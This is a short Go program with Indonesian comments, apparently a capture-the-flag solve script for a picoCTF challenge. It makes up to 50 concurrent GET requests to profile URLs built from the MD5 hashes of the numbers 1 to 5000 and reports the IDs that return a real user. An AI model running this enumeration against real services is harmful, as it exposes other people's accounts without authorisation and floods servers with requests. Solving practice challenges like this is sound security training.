package main

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	baseURL := "http://crystal-peak.picoctf.net:49155/profile/user/"

	concurrencyLimit := 50
	sem := make(chan struct{}, concurrencyLimit)

	var wg sync.WaitGroup

	// Gunakan http.Client kustom dengan timeout agar tidak menggantung
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for i := 1; i <= 5000; i++ {
		wg.Add(1)
		go func(angka int) {
			defer wg.Done()

			// Masuk ke antrean semaphore
			sem <- struct{}{}
			defer func() { <-sem }()

			// 1. Buat hash MD5 dari angka
			hasher := md5.New()
			hasher.Write([]byte(strconv.Itoa(angka)))
			hashed := hex.EncodeToString(hasher.Sum(nil))

			// 2. Susun URL target
			url := baseURL + hashed

			// 3. Lakukan request GET
			resp, err := client.Get(url)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			// 4. Baca response body
			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}
			bodyString := string(bodyBytes)

			// 5. Cek kondisi (jika bukan halaman error/not found)
			if !strings.Contains(bodyString, "User not found") {
				fmt.Printf("[+] Hit! Payload angka: %d | URL: %s\n", angka, url)
			}
		}(i)
	}

	// Tunggu semua goroutine selesai
	wg.Wait()
}
